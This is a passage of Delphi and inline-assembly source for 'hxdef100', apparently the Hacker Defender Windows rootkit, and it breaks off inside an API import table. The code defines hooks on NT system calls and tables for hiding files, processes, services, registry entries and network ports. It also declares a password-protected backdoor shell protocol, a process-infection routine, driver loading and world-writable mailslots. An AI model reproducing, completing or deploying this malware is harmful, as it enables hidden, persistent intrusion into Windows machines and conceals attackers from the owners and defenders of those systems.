program hxdef100;
{ $DEFINE TESTINGTIME}
{ $DEFINE NOSAFEBOOT}
{ $DEFINE NODRIVER}
{ $DEFINE LOGGING}

{$IFNDEF NODRIVER}
{$R driver.res}
{$ENDIF}

{$IFDEF TESTINGTIME}
uses Windows,USysUtils,WinSvc,UJQCompress,UList,UProcAPI;

{$ELSE}
uses Windows,USysUtils,WinSvc,UJQCompress,UList;
{$ENDIF}

const
 {$IFDEF LOGGING}
 Logging_Level=3;
 {$ELSE}
 Logging_Level=0;
 {$ENDIF}

 ServerMailslotNamePart='\\.\mailslot\hxdef-rk100s';
 ClientMailslotNamePart='\\.\mailslot\hxdef-rkc';
 DriverDeviceName='\\.\HxDefDriver';
 SettingsCount=8;
 HooksCount=19;//20;//23;
 DLLImport=5;
 Kernel32Import=22;
 AdvapiImport=10;
 User32Import=1;
 WS2_32Import=12;
{$IFNDEF LOGGING}
 NtDLLImport=40;
{$ELSE}
 NtDLLImport=41;
 HxdefLogFileName='c:\hxdlogex.txt';
{$ENDIF}
 TotalImport=Kernel32Import+AdvapiImport+User32Import+WS2_32Import+NtDLLImport;
 HackerIdentificator='kernel32.dll'+#00;
 FileMappingNameMaxLen=32;
 ComSpec='COMSPEC';
 HP_ReadFile=0;                                         //0
 HP_NtQuerySystemInformation=HP_ReadFile+1;             //1
 HP_NtResumeThread=HP_NtQuerySystemInformation+3;       //4
 HP_NtReadVirtualMemory=HP_NtResumeThread+3;            //7
 HP_NtDeviceIoControlFile=HP_NtReadVirtualMemory+2;     //9
 HP_NtOpenProcess=HP_NtDeviceIoControlFile+8;           //17
 HP_NtCreateFile=HP_NtOpenProcess+1;                    //18
 HP_NtNotifyChangeDirectoryFile=HP_NtCreateFile+2;      //20

 MAILSLOT_TIMEOUT=3000;
 MEMORY_BASIC_INFORMATION_SIZE=SizeOf(TMemoryBasicInformation);
 ENUM_SERVICE_STATUS_SIZE=SizeOf(TEnumServiceStatus);
 ENUM_SERVICE_STATUS_PROCESS_SIZE=SizeOf(TEnumServiceStatus)+8;
 STARTUP_INFO_SIZE=$44;
 SYSTEM_HANDLE_INFORMATION_SIZE=$10;
 SystemProcessesAndThreadsInformation=5;
 ObjectNameInformation=1;
 FileFsSizeInformation=3;
 FileFsFullSizeInformation=7;

 ACL_REVISION=$0003;
 SECURITY_WORLD_SID_AUTHORITY:TSIDIdentifierAuthority=(Value:(0,0,0,0,0,1));
 SECURITY_WORLD_RID:Cardinal=$00000000;
 SECURITY_ATTRIBUTES_SIZE=SizeOf(TSecurityAttributes);

 C_MEM1         =$0001;
 C_MEM2         =$0002;
 C_MEM4         =$0004;
 C_PREFIX       =$0008;
 C_67           =$0010;
 C_MEM67        =$0020;
 C_DATA1        =$0100;
 C_DATA2        =$0200;
 C_DATA4        =$0400;
 C_66           =$1000;
 C_DATA66       =$2000;
 C_MODRM        =$4000;
 C_DATAW0       =$8000;

 SOCKET_ERROR=-1;
 WSA_FLAG_OVERLAPPED=$01;
 FIONBIO=$8004667E;
 FIONREAD=$4004667F;
 AF_INET=2;
 IPPROTO_TCP=6;
 SOCK_STREAM=1;
 SOCK_ADDR_SIZE=16;
 FD_READ=$01;
 FD_CLOSE=$20;
 FD_ALL_EVENTS=$03FF;
 WAITFOREVENTSTIMEOUT=250;
 WSA_WAIT_TIMEOUT=$00000102;
 MIB_TCPROW_SIZE=$14;
 MIB_UDPROW_SIZE=$08;
 TDI_CONN_IN_SIZE=$18;
 TDI_CONN_OUT_FREE_SIZE=$30;

 MASTER_KEY_LEN=32;
 HOOK_TABLE_ITEM_SIZE=2*8+5;                    //16 nops and jump

 ShortcutCount=5;

 FMP_HIDDEN_TABLE       =0;
 FMP_ROOT_PROCESSES     =1;
 FMP_HIDDEN_SERVICES    =2;
 FMP_HIDDEN_REG_KEYS    =3;
 FMP_HIDDEN_REG_VALUES  =4;
 FMP_BACKDOOR_PASSWORD  =5;
 FMP_FREE_SPACE         =6;
 FMP_HIDDEN_PORTS       =7;

 RK_RUN_BACKDOOR_REQ            =$01;
 RK_RUN_BACKDOOR_RES            =$02;
 RK_REFRESH_SETTINGS            =$03;
 RK_UNINSTALL                   =$FE;
 RK_DIE                         =$FF;

 BSC_INIT_REQ_1                 =$E0;
 BSC_INIT_RES_1                 =$E1;
 BSC_INIT_REQ_2                 =$E2;
 BSC_INIT_RES_2                 =$E3;
 BSC_INIT_REQ_3                 =$E4;
 BSC_INIT_RES_3                 =$E5;
 BSC_INIT_COMPLETE              =$E6;
 BSC_CONSOLE_INPUT              =$E7;
 BSC_CONSOLE_OUTPUT             =$E8;
 BSC_AUTHORIZATION_OK           =$E9;
 BSC_AUTHORIZATION_FAILED       =$EA;
 BSC_SERVICE_BACKDOOR           =$EB;
 BSC_SERVICE_REDIRECTOR         =$EC;
 BSC_SERVICE_TEST_REQ           =$ED;
 BSC_SERVICE_TEST_RES           =$EE;
 BSC_CTRL_EVENT                 =$EF;
 BSC_END_REQ                    =$F0;

 DOCTOR_INFECT                  =$00000001;
 DOCTOR_CURE                    =$00000002;

 DIRECT_HOOK_HOOK               =$00000001;
 DIRECT_HOOK_UNHOOK             =$00000002;

 //we need array of notify information indexed by notification handles
 //size of information is 9 * 4 = 36 bytes
 //maximum number of handles is 65536 / 4 = 16384
 //this mean 589 824 bytes for one process
 NOTIFY_TABLE_ENTRY_SIZE        =9*4;
 NOTIFY_TABLE_SIZE              =NOTIFY_TABLE_ENTRY_SIZE*16384;

 //we have to set a new timeout value for wait* functions
 //because of freeing memory in unhooking process
 //all target process threads has to leave all hooked api before freeing memory
 NEW_WAIT_TIMEOUT               =2500000;               //250 ms in 100 nanosec units

type
 //THookType=(htNewProcess,htRehook,htExistingProcess);
 TStartupFlags=(sfNormal,sfInstallOnly,sfNoService,sfRefresh,sfBackdoor,sfUninstall);
 TWindowsVersion=(wvUnknown,wvWin32s,wvWindowsNT40,wvWindows95,wvWindows95OSR2,wvWindows98,wvWindows98SE,wvWindows2000,wvWindowsMe,wvWindowsXP);

 TIntercomBuffer=packed record
  ID:array[0..3] of Char;
  Msg:Byte;
  Data1,Data2:Cardinal;
 end;

 ACE_HEADER=record
  AceType:Byte;
  AceFlags:Byte;
  AceSize:Word;
 end;
 ACCESS_MASK=DWORD;
 ACCESS_ALLOWED_ACE=record
  Header:ACE_HEADER;
  Mask:ACCESS_MASK;
  SidStart:DWORD;
 end;
 TSocket=Cardinal;

 TCharInfoEx=record
  case Byte of
   0:(UnicodeChar:WCHAR;
      UAttributes:Word);
   1:(AsciiChar:CHAR;
      AAttributes:Word);
 end;

 TConsoleScreen=array[0..24,0..79] of TCharInfoEx;
 TConsoleScreenSmall=record
  Chars:array[0..25*80-1] of Char;
  Attrs:array[0..25*80-1] of Byte;
 end;

 TOutputBuffer=record
  ConsoleBuffer:TConsoleScreenSmall;
  CursorPosition:TCoord;
 end;
 TInputBuffer=array[0..127] of TInputRecord;
 PBackdoorBuffer=^TBackdoorBuffer;
 TBackdoorBuffer=packed record
  ID:Byte;
  Size:Word;
  case Byte of
   0:(InputBuffer:TInputBuffer);
   1:(OutputBuffer:TOutputBuffer);
   2:(CtrlType:Cardinal);
   3:(Raw:array[0..4000-1] of Char);
 end;

 PStringListItem=^TStringListItem;
 TStringListItem=array[0..255] of Char;

 PUnicodeString=^TUnicodeString;
 TUnicodeString=packed record
  Length,MaximumLength:Word;
  Buffer:PWideChar;
 end;
 PAnsiString=^TAnsiString;
 TAnsiString=packed record
  Length,MaximumLength:Word;
  Buffer:PChar;
 end;

 TVmCounters=packed record
  PeakVirtualSize,VirtualSize:PCardinal;
  PageFaultCount:ULONG;
  PeakWorkingSetSize,WorkingSetSize,QuotaPeakPagedPoolUsage,QuotaPagedPoolUsage,
  QuotaPeakNonPagedPoolUsage,QuotaNonPagedPoolUsage,PagefileUsage,PeakPagefileUsage:PCardinal;
 end;
 TIoCounters=packed record
  ReadOperationCount,WriteOperationCount,OtherOperationCount,ReadTransferCount,
  WriteTransferCount,OtherTransferCount:Int64;
 end;

 TClientId=packed record
  UniqueProcess,UniqueThread:Cardinal;
 end;

 TSystemThreads=packed record
  KernelTime,UserTime,CreateTime:Int64;
  WaitTime:Cardinal;
  StartAddress:Pointer;
  ClientId:TClientId;
  Priority,BasePriority,ContextSwitchCountState,WaitReason:Cardinal;
 end;
 
 PSystemProcesses=^TSystemProcesses;
 TSystemProcesses=packed record
  NextEntryDelta,ThreadCount:Cardinal;
  Reserved1:array[0..5]of Cardinal;
  CreateTime,UserTime,KernelTime:Int64;
  ProcessName:TUnicodeString;
  BasePriority,ProcessId,InheritedFromProcessId,HandleCount:Cardinal;
  Reserved2:array[0..1] of Cardinal;
  VmCounters:TVmCounters;
  IoCounters:TIoCounters;
  Threads:array [0..0] of TSystemThreads;
 end;

 PObjectNameInformation=^TObjectNameInformation;
 TObjectNameInformation=packed record
  Name:TUnicodeString;
 end;
 TIoStatusBlock=packed record
  case Integer of
   0:(Status:Cardinal);
   1:(Pointer:Pointer;
   Information:PCardinal);
 end;
 TFileFSSizeInformation=record
  TotalAllocationUnits,AvailableAllocationUnits:LARGE_INTEGER;
  SectorsPerAllocationUnit,BytesPerSector:Cardinal;
 end;

 TNtQuerySystemInformation=function(ASystemInformationClass:Cardinal;ASystemInformation:Pointer;
                                    ASystemInformationLength:Cardinal;AReturnLength:PCardinal):Cardinal; stdcall;
 TNtLoadDriver=function(ADriverServiceName:PUnicodeString):Cardinal; stdcall;
 TNtQueryObject=function(AObjectHandle:THandle;AObjectInformationClass:Cardinal;AObjectInformation:Pointer;AObjectInformationLength:Cardinal;AReturnLength:PCardinal):Cardinal; stdcall;
 TNtQueryVolumeInformationFile=function(AFileHandle:THandle;AIoStatusBlock:Pointer;AVolumeInformation:Pointer;AVolumeInformationLength:Cardinal;AVolumeInformationClass:Cardinal):Cardinal; stdcall;
 TRtlAnsiStringToUnicodeString=function(ADestinationString:PUnicodeString;ASourceString:PAnsiString;AAllocateDestinationString:Boolean):Cardinal; stdcall;
 TRtlUnicodeStringToAnsiString=function(ADestinationString:PAnsiString;ASourceString:PUnicodeString;AAllocateDestinationString:Boolean):Cardinal; stdcall;
 TRtlFreeAnsiString=function(AAnsiString:PAnsiString):Cardinal; stdcall;
 TRtlFreeUnicodeString=function(AUnicodeString:PUnicodeString):Cardinal; stdcall;
 TRtlInitUnicodeString=function(ADestinationString:PUnicodeString;ASourceString:PWideChar):Cardinal; stdcall;

const
 INTERCOM_BUFFER_SIZE=SizeOf(TIntercomBuffer);
 ACL_SIZE=SizeOf(ACL)+SizeOf(ACCESS_ALLOWED_ACE)-SizeOf(DWORD);
 INVALID_SOCKET=TSocket(not(0));

var
 HiddenArray,RootArray,ServicesArray,RegKeysArray,RegValuesArray:array[0..65535] of Char;
 FreeSpaceArray:array[0..26*40-1] of Char;
 HiddenPortsArray:array[0..2*65536-1] of Char;
 PasswordArray:array[0..3] of Char;
 BytesRead,BytesWritten,HiddenArraySize,RootArraySize,ServicesArraySize,RegKeysArraySize,
 RegValuesArraySize,PasswordArraySize,FreeSpaceArraySize,HiddenPortsArraySize,MessageSize,TID:Cardinal;
 ServerMailslotHandle,ServerMailslotFileHandle,IniMappingHandle:THandle;
 GetProcAddressAddr,GetModuleHandleAAddr,IniMappingAddr:Pointer;
 PB:PByte;
 InfectedProcessCount,MsgSender,RealHookedCount,SomeCreateProcess:Integer;
 Done,IsService,MainLoopRunning:Boolean;
 FIni:TextFile;
 MailslotName,IniFile:string;
 IntercomBuffer:TIntercomBuffer;
 BasicOffset:Cardinal;          //this is static delphi address for its consts
                                //but we need dynamical, NO static
                                //so we will subtract this magic number every time we need
                                //e.g. =$00404EAB

 DispatchTable:array[0..1] of TServiceTableEntry;
 ServiceStatusHandle:SERVICE_STATUS_HANDLE;
 ServiceStatus:TServiceStatus;
 StartupFlags:TStartupFlags;

 BackdoorVars:record
  BSHRun:Boolean;
  BackdoorMailslotName,SrvMailslotName:string;
  SrvMailslotHandle,BackdoorMailslotHandle,InputHandle,OutputHandle:THandle;
  FirstCoords,SecondCoords:TCoord;
  FirstRect:TSmallRect;
  FullConsoleScreen:TConsoleScreen;
  ShellProcess:Cardinal;
 end;

 BackdoorShell,ServiceName,ServiceDisplayName,ServiceDescription,DriverName,DriverFileName,
 FileMappingName,ServerMailslotName:string;

 NtQuerySystemInformation:TNtQuerySystemInformation;
 NtLoadDriver:TNtLoadDriver;
 NtQueryObject:TNtQueryObject;
 NtQueryVolumeInformationFile:TNtQueryVolumeInformationFile;
 RtlAnsiStringToUnicodeString:TRtlAnsiStringToUnicodeString;
 RtlUnicodeStringToAnsiString:TRtlUnicodeStringToAnsiString;
 RtlFreeAnsiString:TRtlFreeAnsiString;
 RtlFreeUnicodeString:TRtlFreeUnicodeString;
 RtlInitUnicodeString:TRtlInitUnicodeString;
 Shortcuts:array[0..ShortcutCount-1] of record
  OrgStr,NewStr:string;
 end;

 Argv1:string;
 Argc:Cardinal;

{$IFDEF LOGGING}
procedure Log(a:string;e:Boolean=True); stdcall;
var
 f:textfile;
begin
 assignfile(f,HxdefLogFileName);
 if fileexists(HxdefLogFileName) then append(f)
 else rewrite(f);
 write(f,'main: ');
 write(f,a);
 if e then writeln(f);
 closefile(f);
end;

procedure LogUnicodeString(a:PUnicodeString;e:boolean); stdcall;
var
 f:textfile;
 i,l:integer;
 buffer:array[0..255] of char;
begin
 assignfile(f,HxdefLogFileName);
 if fileexists(HxdefLogFileName) then append(f)
 else rewrite(f);
 l:=a^.Length;
 copymemory(@buffer,a^.Buffer,l);
 for i:=0 to l div 2-1 do
  write(f,buffer[i*2]);
 if e then writeln(f);
 closefile(f);
end;

procedure LogInt(a:Integer;e:boolean); stdcall;
var
 f:textfile;
begin
 assignfile(f,HxdefLogFileName);
 if fileexists(HxdefLogFileName) then append(f)
 else rewrite(f);
 write(f,a);
 if e then writeln(f);
 closefile(f);
end;

procedure LogChar(a:char); stdcall;
var
 f:textfile;
begin
 assignfile(f,HxdefLogFileName);
 if fileexists(HxdefLogFileName) then append(f)
 else rewrite(f);
 write(f,a);
 closefile(f);
end;
{$ENDIF}

procedure Main; forward;
function DirectHook(APID,AOperation:Cardinal):Cardinal; stdcall; assembler; forward;
procedure DirectHookEnd; assembler; forward;
procedure SendMainLoopTermination(AUninstall:Boolean); forward;

function CreateEveryoneSecAttr(var ASecAttr:TSecurityAttributes;var ASecDesc:TSecurityDescriptor;var APDAcl:PAcl):Boolean;
var
 LDAcl:PAcl;
 LEveryoneSid:PSID;
 LAclSize:Cardinal;
begin
 Result:=False;
 if not AllocateAndInitializeSid(SECURITY_WORLD_SID_AUTHORITY,1,SECURITY_WORLD_RID,0,0,0,0,0,0,0,LEveryoneSid) then Exit;
 LAclSize:=SizeOf(ACL)+SizeOf(ACCESS_ALLOWED_ACE)+GetLengthSid(LEveryoneSid)-SizeOf(DWORD);
 LDAcl:=VirtualAlloc(nil,LAclSize,MEM_COMMIT,PAGE_READWRITE);
 if LDAcl=nil then Exit
 else APDAcl:=LDAcl;
 if not InitializeAcl(LDAcl^,LAclSize,ACL_REVISION) then Exit;
 if not AddAccessAllowedAce(LDAcl^,ACL_REVISION,GENERIC_ALL,LEveryoneSid) then Exit;
 if not InitializeSecurityDescriptor(@ASecDesc,SECURITY_DESCRIPTOR_REVISION) then Exit;
 if not SetSecurityDescriptorDacl(@ASecDesc,True,LDAcl,False) then Exit;

 with ASecAttr do
 begin
  lpSecurityDescriptor:=@ASecDesc;
  nLength:=SizeOf(ASecAttr);
  bInheritHandle:=False;
 end;

 Result:=True;
end;

function CreateServerMailslot(AMailslotName:string;var APDAcl:PAcl):Boolean;
var
 LSecAttr:TSecurityAttributes;
 LSecDesc:TSecurityDescriptor;

begin
 Result:=False;
 if not CreateEveryoneSecAttr(LSecAttr,LSecDesc,APDAcl) then Exit;
 ServerMailslotHandle:=CreateMailslot(PChar(AMailslotName),0,INFINITE,@LSecAttr);
 ServerMailslotFileHandle:=CreateFile(PChar(AMailslotName),GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE,
                                      nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

 Result:=not ((ServerMailslotHandle=INVALID_HANDLE_VALUE) or (ServerMailslotFileHandle=INVALID_HANDLE_VALUE));
end;

procedure CheckUniqInstance;
var
 LFile:THandle;
begin
 LFile:=CreateFile(PChar(ServerMailslotName),GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 if LFile<>INVALID_HANDLE_VALUE then
 begin
  CloseHandle(LFile);
  if StartupFlags<>sfInstallOnly then Halt;
 end;
end;

function DirectHook(APID,AOperation:Cardinal):Cardinal; stdcall; assembler;
asm
 pop ebp                                //delphi call
 jmp @DirectHook_begin

 @Body:
 @GetAddr:
  call @GetBaseAddr
 @GetBaseAddr:
  pop eax
  db 02Dh                               //sub eax
 @GetBaseAddr_BasicOffset:
  db 000h,000h,000h,000h                //BasicOffset
  ret

 @FileMappingName                       : db 041h,041h,041h,000h,000h,000h,000h,000h
                                          db 000h,000h,000h,000h,000h,000h,000h,000h
                                          db 000h,000h,000h,000h,000h,000h,000h,000h
                                          db 000h,000h,000h,000h,000h,000h,000h,000h
                                          db 000h

 @cMainProcessPID                       : db 000h,000h,000h,000h

 @DLLNames                              :
 @Kernel32_DLL                          :
  @Kernel32DLLName                      : db 'kernel32.dll'                     ,000h
 @Kernel_API                            :
  @SetLastErrorName                     : db 'SetLastError'                     ,000h
  @CreateMailslotAName                  : db 'CreateMailslotA'                  ,000h
  @GetMailslotInfoName                  : db 'GetMailslotInfo'                  ,000h
  @WriteFileName                        : db 'WriteFile'                        ,000h
  @ReadFileName                         : db 'ReadFile'                         ,000h
  @CloseHandleName                      : db 'CloseHandle'                      ,000h
  @GetEnvironmentVariableWName          : db 'GetEnvironmentVariableW'          ,000h
  @GetModuleFileNameAName               : db 'GetModuleFileNameA'               ,000h
  @DuplicateHandleName                  : db 'DuplicateHandle'                  ,000h
  @CreateProcessAName                   : db 'CreateProcessA'                   ,000h
  @ExitThreadName                       : db 'ExitThread'                       ,000h
  @CreateThreadName                     : db 'CreateThread'                     ,000h
  @CreatePipeName                       : db 'CreatePipe'                       ,000h
  @PeekNamedPipeName                    : db 'PeekNamedPipe'                    ,000h
  @WaitForMultipleObjectsName           : db 'WaitForMultipleObjects'           ,000h
  @TerminateThreadName                  : db 'TerminateThread'                  ,000h
  @TerminateProcessName                 : db 'TerminateProcess'                 ,000h
  @DisconnectNamedPipeName              : db 'DisconnectNamedPipe'              ,000h
  @IsBadReadPtrName                     : db 'IsBadReadPtr'                     ,000h
  @OpenProcessName                      : db 'OpenProcess'                      ,000h
  @LocalAllocName                       : db 'LocalAlloc'                       ,000h
  @LocalFreeName                        : db 'LocalFree'                        ,000h
  @GetLastErrorName                     : db 'GetLastError'                     ,000h

 @Advapi32_DLL                          :
  @Advapi32DLLName                      : db 'advapi32.dll'                     ,000h
 @Advapi_API                            :
  @EnumServiceGroupWName                : db 'EnumServiceGroupW'                ,000h
  @EnumServicesStatusAName              : db 'EnumServicesStatusA'              ,000h
  @EnumServicesStatusExWName            : db 'EnumServicesStatusExW'            ,000h
  @EnumServicesStatusExAName            : db 'EnumServicesStatusExA'            ,000h
{new 078}
  @AllocateAndInitializeSidName         : db 'AllocateAndInitializeSid'         ,000h
  @GetLengthSidName                     : db 'GetLengthSid'                     ,000h
  @InitializeAclName                    : db 'InitializeAcl'                    ,000h
  @AddAccessAllowedAceName              : db 'AddAccessAllowedAce'              ,000h
  @InitializeSecurityDescriptorName     : db 'InitializeSecurityDescriptor'     ,000h
  @SetSecurityDescriptorDaclName        : db 'SetSecurityDescriptorDacl'        ,000h
{/new 078}

 @WS2_32_DLL                            :
  @WS2_32DLLName                        : db 'ws2_32.dll'                       ,000h
 @WS2_32_API                            :
  @sendName                             : db 'send'                             ,000h
  @recvName                             : db 'recv'                             ,000h
  @WSARecvName                          : db 'WSARecv'                          ,000h
  @WSAGetLastErrorName                  : db 'WSAGetLastError'                  ,000h
  @WSAEventSelectName                   : db 'WSAEventSelect'                   ,000h
  @WSAIoctlName                         : db 'WSAIoctl'                         ,000h
  @WSASocketAName                       : db 'WSASocketA'                       ,000h
  @WSAConnectName                       : db 'WSAConnect'                       ,000h
  @WSACreateEventName                   : db 'WSACreateEvent'                   ,000h
  @WSAWaitForMultipleEventsName         : db 'WSAWaitForMultipleEvents'         ,000h
  @WSAEnumNetworkEventsName             : db 'WSAEnumNetworkEvents'             ,000h
  @closesocketName                      : db 'closesocket'                      ,000h

 @User32_DLL                            :
  @User32DLLName                        : db 'user32.dll'                       ,000h
 @User32_API                            :
  @PeekMessageAName                     : db 'PeekMessageA'                     ,000h

 @NTDLL_DLL                             :
  @NTDLLDLLName                         : db 'ntdll.dll'                        ,000h
 @NTDLL_API                             :
  @NtQuerySystemInformationName         : db 'NtQuerySystemInformation'         ,000h
  @NtQueryDirectoryFileName             : db 'NtQueryDirectoryFile'             ,000h
  @NtVdmControlName                     : db 'NtVdmControl'                     ,000h
  @NtQueryObjectName                    : db 'NtQueryObject'                    ,000h
  @NtQueryInformationThreadName         : db 'NtQueryInformationThread'         ,000h
  @NtResumeThreadName                   : db 'NtResumeThread'                   ,000h
  @NtSuspendThreadName                  : db 'NtSuspendThread'                  ,000h
  @NtOpenThreadName                     : db 'NtOpenThread'                     ,000h
  @NtEnumerateKeyName                   : db 'NtEnumerateKey'                   ,000h
  @NtEnumerateValueKeyName              : db 'NtEnumerateValueKey'              ,000h
  @NtQueryVolumeInformationFileName     : db 'NtQueryVolumeInformationFile'     ,000h
  @LdrInitializeThunkName               : db 'LdrInitializeThunk'               ,000h
  @LdrLoadDllName                       : db 'LdrLoadDll'                       ,000h
  @NtOpenSectionName                    : db 'NtOpenSection'                    ,000h
  @NtMapViewOfSectionName               : db 'NtMapViewOfSection'               ,000h
  @NtUnmapViewOfSectionName             : db 'NtUnmapViewOfSection'             ,000h
  @NtOpenDirectoryObjectName            : db 'NtOpenDirectoryObject'            ,000h
  @NtCloseName                          : db 'NtClose'                          ,000h
  @NtAllocateVirtualMemoryName          : db 'NtAllocateVirtualMemory'          ,000h
  @NtFreeVirtualMemoryName              : db 'NtFreeVirtualMemory'              ,000h
  @NtOpenProcessName                    : db 'NtOpenProcess'                    ,000h
  @NtDuplicateObjectName                : db 'NtDuplicateObject'                ,000h
  @NtReadVirtualMemoryName              : db 'NtReadVirtualMemory'              ,000h
  @NtWriteVirtualMemoryName             : db 'NtWriteVirtualMemory'             ,000h
  @NtQueryVirtualMemoryName             : db 'NtQueryVirtualMemory'             ,000h
  @NtFlushInstructionCacheName          : db 'NtFlushInstructionCache'          ,000h
  @NtProtectVirtualMemoryName           : db 'NtProtectVirtualMemory'           ,000h
  @NtQueryInformationProcessName        : db 'NtQueryInformationProcess'        ,000h
  @NtOpenKeyName                        : db 'NtOpenKey'                        ,000h
  @RtlAnsiStringToUnicodeStringName     : db 'RtlAnsiStringToUnicodeString'     ,000h
  @RtlCompareUnicodeStringName          : db 'RtlCompareUnicodeString'          ,000h
  @RtlInitAnsiStringName                : db 'RtlInitAnsiString'                ,000h
  @NtCreateFileName                     : db 'NtCreateFile'                     ,000h
  @NtDeviceIoControlFileName            : db 'NtDeviceIoControlFile'            ,000h
  @NtOpenFileName                       : db 'NtOpenFile'                       ,000h
  @NtNotifyChangeDirectoryFileName      : db 'NtNotifyChangeDirectoryFile'      ,000h
  @NtWaitForSingleObjectName            : db 'NtWaitForSingleObject'            ,000h
  @NtWaitForMultipleObjectsName         : db 'NtWaitForMultipleObjects'         ,000h
  @NtDelayExecutionName                 : db 'NtDelayExecution'                 ,000h
  @NtQuerySystemTimeName                : db 'NtQuerySystemTime'                ,000h

{$IFDEF LOGGING}
  @NtWriteFileName                      : db 'NtWriteFile'                      ,000h
{$ENDIF}


 @DLLStatic                             :
                                          dd @Kernel32DLLName
                                          dd @LKernel32DLLHandle
                                          dd Kernel32Import
                                          dd @KernelStatic

                                          dd @Advapi32DLLName
                                          dd @LAdvapi32DLLHandle
                                          dd AdvapiImport
                                          dd @AdvapiStatic

                                          dd @WS2_32DLLName
                                          dd @LWS2_32DLLHandle
                                          dd WS2_32Import
                                          dd @WS2_32Static

                                          dd @User32DLLName
                                          dd @LUser32DLLHandle
                                          dd User32Import
                                          dd @User32Static

                                          dd @NtDLLDLLName
                                          dd @LNtDLLDLLHandle
                                          dd NtDLLImport
                                          dd @NtDllStatic



 @KernelStatic                          :
                                          dd @SetLastErrorName
                                          dd @SetLastErrorAddr
                                          dd @CreateMailslotAName
                                          dd @CreateMailslotAAddr
                                          dd @GetMailslotInfoName
                                          dd @GetMailslotInfoAddr
                                          dd @WriteFileName
                                          dd @WriteFileAddr
                                          dd @ReadFileName
                                          dd @ReadFileAddr
                                          dd @CloseHandleName
                                          dd @CloseHandleAddr
                                          dd @GetEnvironmentVariableWName
                                          dd @GetEnvironmentVariableWAddr
                                          dd @GetModuleFileNameAName
                                          dd @GetModuleFileNameAAddr
                                          dd @DuplicateHandleName
                                          dd @DuplicateHandleAddr
                                          dd @CreateProcessAName
                                          dd @CreateProcessAAddr
                                          dd @ExitThreadName
                                          dd @ExitThreadAddr
                                          dd @CreateThreadName
                                          dd @CreateThreadAddr
                                          dd @CreatePipeName
                                          dd @CreatePipeAddr
                                          dd @PeekNamedPipeName
                                          dd @PeekNamedPipeAddr
                                          dd @WaitForMultipleObjectsName
                                          dd @WaitForMultipleObjectsAddr
                                          dd @TerminateThreadName
                                          dd @TerminateThreadAddr
                                          dd @TerminateProcessName
                                          dd @TerminateProcessAddr
                                          dd @DisconnectNamedPipeName
                                          dd @DisconnectNamedPipeAddr
                                          dd @IsBadReadPtrName
                                          dd @IsBadReadPtrAddr
                                          dd @LocalAllocName
                                          dd @LocalAllocAddr
                                          dd @LocalFreeName
                                          dd @LocalFreeAddr
                                          dd @GetLastErrorName
                                          dd @GetLastErrorAddr

 @AdvapiStatic                          :
                                          dd @EnumServiceGroupWName
                                          dd @EnumServiceGroupWAddr
                                          dd @EnumServicesStatusExWName
                                          dd @EnumServicesStatusExWAddr
                                          dd @EnumServicesStatusExAName
                                          dd @EnumServicesStatusExAAddr
                                          dd @EnumServicesStatusAName
                                          dd @EnumServicesStatusAAddr
                                          {new 078}
                                          dd @AllocateAndInitializeSidName
                                          dd @AllocateAndInitializeSidAddr
                                          dd @GetLengthSidName
                                          dd @GetLengthSidAddr
                                          dd @InitializeAclName
                                          dd @InitializeAclAddr
                                          dd @AddAccessAllowedAceName
                                          dd @AddAccessAllowedAceAddr
                                          dd @InitializeSecurityDescriptorName
                                          dd @InitializeSecurityDescriptorAddr
                                          dd @SetSecurityDescriptorDaclName
                                          dd @SetSecurityDescriptorDaclAddr
                                          {/new 078}

 @WS2_32Static                          :
                                          dd @sendName
                                          dd @sendAddr
                                          dd @recvName
                                          dd @recvAddr
                                          dd @WSARecvName
                                          dd @WSARecvAddr
                                          dd @WSAGetLastErrorName
                                          dd @WSAGetLastErrorAddr
                                          dd @WSAEventSelectName
                                          dd @WSAEventSelectAddr
                                          dd @WSAIoctlName
                                          dd @WSAIoctlAddr
                                          dd @WSASocketAName
                                          dd @WSASocketAAddr
                                          dd @WSAConnectName
                                          dd @WSAConnectAddr
                                          dd @WSACreateEventName
                                          dd @WSACreateEventAddr
                                          dd @WSAWaitForMultipleEventsName
                                          dd @WSAWaitForMultipleEventsAddr
                                          dd @WSAEnumNetworkEventsName
                                          dd @WSAEnumNetworkEventsAddr
                                          dd @closesocketName
                                          dd @closesocketAddr

 @User32Static                          :
                                          dd @PeekMessageAName
                                          dd @PeekMessageAAddr

 @NtDLLStatic                           :
                                          dd @NtQueryObjectName
                                          dd @NtQueryObjectAddr
                                          dd @NtQueryInformationThreadName
                                          dd @NtQueryInformationThreadAddr
                                          dd @NtQuerySystemInformationName
                                          dd @NtQuerySystemInformationAddr
                                          dd @NtQueryDirectoryFileName
                                          dd @NtQueryDirectoryFileAddr
                                          dd @NtVdmControlName
                                          dd @NtVdmControlAddr
                                          dd @NtResumeThreadName
                                          dd @NtResumeThreadAddr
                                          dd @NtSuspendThreadName
                                          dd @NtSuspendThreadAddr
                                          dd @NtOpenThreadName
                                          dd @NtOpenThreadAddr
                                          dd @NtEnumerateKeyName
                                          dd @NtEnumerateKeyAddr
                                          dd @NtEnumerateValueKeyName
                                          dd @NtEnumerateValueKeyAddr
                                          dd @NtQueryVolumeInformationFileName
                                          dd @NtQueryVolumeInformationFileAddr
                                          dd @LdrLoadDllName
                                          dd @LdrLoadDllAddr
                                          dd @NtOpenSectionName
                                          dd @NtOpenSectionAddr
                                          dd @NtMapViewOfSectionName
                                          dd @NtMapViewOfSectionAddr
                                          dd @NtUnmapViewOfSectionName
                                          dd @NtUnmapViewOfSectionAddr
                                          dd @NtOpenDirectoryObjectName
                                          dd @NtOpenDirectoryObjectAddr
                                          dd @NtCloseName
                                          dd @NtCloseAddr
                                          dd @NtAllocateVirtualMemoryName
                                          dd @NtAllocateVirtualMemoryAddr
                                          dd @NtFreeVirtualMemoryName
                                          dd @NtFreeVirtualMemoryAddr
                                          dd @NtOpenProcessName
                                          dd @NtOpenProcessAddr
                                          dd @NtDuplicateObjectName
                                          dd @NtDuplicateObjectAddr
                                          dd @NtReadVirtualMemoryName
                                          dd @NtReadVirtualMemoryAddr
                                          dd @NtWriteVirtualMemoryName
                                          dd @NtWriteVirtualMemoryAddr
                                          dd @NtQueryVirtualMemoryName
                                          dd @NtQueryVirtualMemoryAddr
                                          dd @NtFlushInstructionCacheName
                                          dd @NtFlushInstructionCacheAddr
                                          dd @NtProtectVirtualMemoryName
